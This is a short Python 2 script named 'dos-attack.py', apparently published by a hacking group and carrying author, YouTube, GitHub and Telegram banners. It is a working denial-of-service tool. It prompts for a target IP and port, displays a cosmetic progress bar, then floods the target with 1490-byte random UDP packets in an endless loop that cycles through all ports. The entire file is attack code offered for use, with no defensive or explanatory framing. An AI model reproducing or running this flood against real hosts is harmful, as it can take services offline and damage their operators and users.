# Tools : dos-attack.py - Simple DoS Script.
# Author : XSVSCyb3rID
# Sites : https://xsvscyb3r.id
# Email : xsvscyb3r@proton.me
# Github : github.com/XSVSCyb3rID

import sys
import os
import time
import socket
import random

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")
os.system("figlet Simple DoS Attack Script")
print
print "Author   : XSVSCyb3rID"
print "YouTube : https://www.youtube.com/channel/@XSVSCyb3r101"
print "GitHub   : github.com/XSVSCyb3rID"
print "Telegram : t.me/XSVS_Cyb3r"
print
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

